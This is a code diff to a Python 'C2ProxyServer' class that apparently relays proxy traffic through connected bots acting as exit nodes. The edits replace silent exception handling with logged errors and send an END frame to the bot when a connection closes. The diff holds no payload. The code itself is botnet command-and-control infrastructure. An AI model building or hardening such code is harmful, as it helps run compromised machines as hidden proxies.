@@ -498,8 +498,8 @@ class C2ProxyServer:
         finally:
             try:
                 client_socket.close()
-            except:
-                pass
+            except Exception as e:
+                print(f"⚠️  Error closing client socket: {e}")
                 
     def handle_proxy_request(self, client_socket, client_addr):
         """Xử lý proxy request từ client"""
@@ -1038,8 +1038,8 @@ class C2ProxyServer:
             # Close client socket
             try:
                 connection['client_socket'].close()
-            except:
-                pass
+            except Exception as e:
+                print(f"⚠️  Error closing client socket: {e}")
                 
             # Update bot statistics
             bot_id = connection['bot_id']
@@ -1051,8 +1051,18 @@ class C2ProxyServer:
             self.stats['active_connections'] = max(0, 
                 self.stats['active_connections'] - 1)
                 
+            # Send END frame to bot if still connected
+            try:
+                if bot_id in self.connected_bots:
+                    bot_socket = self.connected_bots[bot_id]['socket']
+                    end_command = f"END:{connection_id}\n"
+                    bot_socket.sendall(end_command.encode())
+            except Exception as e:
+                print(f"⚠️  Error sending END frame to bot: {e}")
+                
             # Remove connection
             del self.active_proxy_connections[connection_id]
+            print(f"🔌 Closed connection: {connection_id}")
             
     def disconnect_bot(self, bot_id):
         """Disconnect bot"""
@@ -1062,8 +1072,8 @@ class C2ProxyServer:
             # Close bot socket
             try:
                 bot_info['socket'].close()
-            except:
-                pass
+            except Exception as e:
+                print(f"⚠️  Error closing client socket: {e}")
                 
             # Remove from exit nodes
             if bot_id in self.bot_exit_nodes:
@@ -1118,14 +1128,14 @@ class C2ProxyServer:
         for connection in self.active_proxy_connections.values():
             try:
                 connection['client_socket'].close()
-            except:
-                pass
+            except Exception as e:
+                print(f"⚠️  Error closing client socket: {e}")
                 
         for bot_info in self.connected_bots.values():
             try:
                 bot_info['socket'].close()
-            except:
-                pass
+            except Exception as e:
+                print(f"⚠️  Error closing client socket: {e}")
                 
         # Close server sockets
         if self.c2_socket:
